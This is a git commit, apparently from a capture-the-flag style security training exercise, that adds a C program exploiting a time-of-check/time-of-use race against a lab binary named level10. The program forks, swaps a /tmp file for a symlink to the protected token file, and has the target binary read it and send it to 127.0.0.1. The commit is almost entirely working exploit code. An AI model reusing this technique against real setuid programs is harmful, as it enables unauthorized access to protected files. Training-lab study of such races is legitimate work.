ebe89b8d33a51988dfb10c7296839b14a73c9df9
pascal <panamepoul@gmail.com>
2020-12-24 01:25:22 +0100

    doing the bonus

---
+++ level10/Ressources/program.c
@@ -0,0 +1,26 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define TOKEN "/home/user/level10/token"
+#define LINK "/tmp/faketoken"
+#define EXE "/home/user/level10/level10"
+
+int main(int ac, char **av)
+{
+	pid_t pid =0;
+
+	unlink(LINK);
+	open(LINK, O_CREAT | O_RDONLY, 0666);
+	pid = fork();
+	if (pid > 0 ) {
+		remove(LINK);
+		symlink(TOKEN, LINK);
+	}
+	else if (pid == 0) {
+		system(EXE" "LINK" 127.0.0.1");
+		exit(EXIT_SUCCESS);
+	}
+	return (0);
+}
